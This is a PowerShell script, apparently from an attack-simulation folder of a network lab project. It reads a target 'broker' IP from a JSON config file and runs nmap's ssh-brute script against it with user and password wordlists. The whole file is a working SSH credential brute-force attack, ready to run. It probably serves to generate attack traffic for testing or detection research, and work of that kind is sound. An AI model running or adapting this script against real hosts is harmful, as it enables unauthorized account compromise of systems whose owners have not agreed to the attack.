# ============================================================
# SSH Bruteforce via Nmap (Config-Driven Version)
# ============================================================

# Get folder of this script (attacks/)
$ScriptDir = Split-Path -Parent $MyInvocation.MyCommand.Path

# Project root = parent of attacks/
$ProjectRoot = Split-Path $ScriptDir -Parent

# ------------------------------------------------------------
# Load network_config.json
# ------------------------------------------------------------
$ConfigPath = Join-Path $ProjectRoot "configs/network_config.json"

if (!(Test-Path $ConfigPath)) {
    Write-Host "[ERROR] Config file not found: $ConfigPath" -ForegroundColor Red
    exit
}

$NetConfig = Get-Content $ConfigPath | ConvertFrom-Json
$TARGET = $NetConfig.broker_ip

Write-Host "[INFO] Target IP from config: $TARGET" -ForegroundColor Cyan

# ------------------------------------------------------------
# Resolve paths to user/password dictionaries
# ------------------------------------------------------------
$USERS = Join-Path $ScriptDir "users.txt"
$PASSWORDS = Join-Path $ScriptDir "passwords.txt"

if (!(Test-Path $USERS)) {
    Write-Host "[ERROR] Missing users file: $USERS" -ForegroundColor Red
    exit
}
if (!(Test-Path $PASSWORDS)) {
    Write-Host "[ERROR] Missing passwords file: $PASSWORDS" -ForegroundColor Red
    exit
}

Write-Host "[INFO] Loaded users.txt and passwords.txt" -ForegroundColor Green

# ------------------------------------------------------------
# Execute SSH Bruteforce with Nmap
# ------------------------------------------------------------
Write-Host "`n[SSH Bruteforce] Running nmap ssh-brute..." -ForegroundColor Yellow

nmap --script ssh-brute --script-args "userdb=$USERS,passdb=$PASSWORDS" $TARGET

Write-Host "`n[DONE] SSH Bruteforce attack finished." -ForegroundColor Green
